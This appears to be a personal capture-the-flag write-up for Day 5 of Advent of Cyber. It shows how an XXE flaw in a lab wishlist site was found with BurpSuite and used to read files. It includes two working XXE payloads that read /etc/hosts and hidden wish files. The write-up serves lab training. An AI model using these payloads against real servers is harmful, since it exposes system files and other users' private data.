# (Day 5) - Advent of Cyber

Target IP - 10.10.89.163

## Website

There is an XXE vulnerability present in the website we can see this by navigating to the website and using BurpSuite to analyse the requests:

![[Pasted image 20241206231318.png]]

Here we see a post request captures from adding an item to a wishlist, let's see if we can exploit this xml, we will try to exploit it using this payload:

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

There we receive this, confirming that an xxe vulnerability is present here:

![[Pasted image 20241206232624.png]]

So now we are able to change our payload to this, trying to see if we are able to see the wishlist's that we weren't able to access previously:

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
<wishlist>
	<user_id>1</user_id>
	<item>
	       <product_id>&payload;</product_id>
	</item>
</wishlist>
```

There we receive this response, we will continue to iterate until we find the flag:

![[Pasted image 20241206233308.png]]

We were also told of a changelog so we decided to move to it, and we see that Mayor Malware has pushed a change after Software.

![[Pasted image 20241206235010.png]]

